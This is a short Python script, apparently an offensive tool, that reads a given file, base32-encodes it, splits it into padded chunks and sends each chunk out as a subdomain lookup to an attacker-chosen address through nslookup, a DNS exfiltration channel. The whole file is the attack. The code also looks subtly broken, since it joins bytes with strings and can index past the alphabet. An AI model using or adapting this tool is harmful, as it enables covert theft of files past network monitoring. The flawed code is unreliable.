#!/usr/bin/python3

import sys
import math
import time
import base64
import random
import signal
import string
import argparse
import subprocess

def handle(sig, frame):
	print("[-] Exiting...")
	sys.exit()

class Encrypt:
	def __init__(self, text):
		self.text = text

	def encrypt(self):
		letters = string.ascii_lowercase

		a = letters[random.randrange(len(self.text))].encode()
		b = letters[random.randrange(len(self.text))].encode()
		c = letters[random.randrange(len(self.text))].encode()

		return a + self.text + b + c

	def encode(self):
		return base64.b32encode(self.text)

def send(file):
	subd = []
	encryptor = Encrypt(file)
	payload = encryptor.encode()
	m = math.ceil(len(payload) / 26)
	n = 0

	while n < m:
		subd.append(Encrypt(payload[:26]).encrypt())
		payload = payload[26::]
		n += 1

	p = 0

	for sub in subd:
		f = sub + '.' + args.address
		print(f"{p / len(subd) * 100:.1f}%", end='\r')
		subprocess.getoutput('nslookup ' + f)
		time.sleep(0.30)
		p += 1

	print("done.")

if __name__ == '__main__':
	signal.signal(signal.SIGINT, handle)

	parser = argparse.ArgumentParser(usage="%(prog)s -a <address> -f <file>")
	parser.add_argument("-a", "--address", help="Address to send.", metavar='', required=1)
	parser.add_argument("-f", "--file", help="File to send.", metavar='', type=argparse.FileType('rb'), required=1)
	args = parser.parse_args()

	input("[>] Starting transmiting...[ENTER]")
	send(args.file.read())